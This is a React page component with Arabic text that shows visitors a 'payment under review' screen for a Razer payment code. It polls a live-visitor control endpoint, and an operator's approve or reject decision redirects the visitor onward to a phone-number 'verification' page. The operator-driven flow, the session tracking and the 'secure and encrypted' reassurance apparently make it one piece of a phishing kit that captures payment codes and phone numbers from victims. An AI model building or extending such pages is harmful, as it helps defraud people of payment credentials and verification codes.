import { useEffect } from "react";
import { useLocation } from "wouter";
import { trpc } from "@/lib/trpc";
import { getSessionId } from "@/lib/useStepSession";
import { SiteLayout } from "@/components/SiteLayout";
import { Loader2, Clock, ShieldCheck } from "lucide-react";

export default function RazerWait() {
  const [, setLocation] = useLocation();
  const sessionId = getSessionId();

  // Polling every 2 seconds to check razer status
  const { data } = trpc.liveVisitors.getControlState.useQuery(
    { sessionId },
    { refetchInterval: 2000 }
  );

  useEffect(() => {
    if (!data) return;
    if (data.razerStatus === "approved") {
      // عند القبول: توجيه لصفحة توثيق رقم الجوال
      setLocation("/number");
    } else if (data.razerStatus === "rejected") {
      // عند الرفض: إعادة لصفحة الدفع مع رسالة خطأ
      setLocation("/razer-payment?error=rejected");
    }
  }, [data, setLocation]);

  return (
    <SiteLayout>
      <div className="min-h-[70vh] flex items-center justify-center px-4">
        <div className="max-w-md w-full text-center space-y-6">
          {/* أيقونة الانتظار */}
          <div className="relative mx-auto w-24 h-24">
            <div className="absolute inset-0 rounded-full bg-blue-100 animate-ping opacity-30" />
            <div className="relative w-24 h-24 rounded-full bg-gradient-to-br from-blue-500 to-blue-700 flex items-center justify-center shadow-xl">
              <Clock className="w-10 h-10 text-white" />
            </div>
          </div>

          {/* الرسالة */}
          <div className="space-y-3">
            <h2 className="text-xl font-bold text-gray-800">
              جاري مراجعة عملية الدفع...
            </h2>
            <div className="flex items-center justify-center gap-2 text-blue-600">
              <Loader2 className="w-5 h-5 animate-spin" />
              <span className="text-sm font-medium">الرجاء الانتظار</span>
            </div>
            <p className="text-gray-600 text-sm leading-relaxed max-w-sm mx-auto">
              يقوم فريق المراجعة بالتحقق من الرمز، وسيتم متابعة طلبك خلال دقائق.
            </p>
          </div>

          {/* شريط الثقة */}
          <div className="flex items-center justify-center gap-2 text-xs text-gray-400 pt-4">
            <ShieldCheck className="w-4 h-4 text-blue-400" />
            <span>عملية آمنة ومشفرة</span>
          </div>
        </div>
      </div>
    </SiteLayout>
  );
}
